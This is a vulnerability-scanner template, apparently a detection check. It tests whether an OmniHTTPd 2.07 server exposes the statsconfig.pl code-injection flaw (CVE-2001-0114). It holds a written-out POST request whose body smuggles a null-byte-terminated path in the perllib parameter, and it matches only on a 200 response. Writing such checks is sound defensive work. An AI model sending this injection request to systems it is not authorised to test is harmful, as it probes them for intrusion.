[info]
author = "ave"
description = "验证目标 OmniHTTPd 2.07 服务器是否存在 statsconfig.pl CGI 脚本的代码注入漏洞。通过向 /cgi-bin/statsconfig.pl 发送包含 mostbrowsers 参数的 POST 请求，检测服务器是否以 200 状态码响应，表明该 CGI 脚本可被访问且代码注入参数可能被处理。"
id = "POC-AVE-2001-0048"
name = "OmniHTTPd 2.07 statsconfig.pl Code Injection PoC"
severity = "medium"
tags = ["ave-2001-0048"]
vuln_id = [
    "CVE-2001-0114",
    "AVE-2001-0048",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/statsconfig.pl"
protocol = "http"

[poc.requests.body]
content = "perllib=/statsconfig.pl%00&cgidir=/cgi-bin&deflimit=&mostip=on&mostreq=on&mostbrowsers=on&timelog=on&mostipnum=5&mostreqf=5&mostbrowsernum=5"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
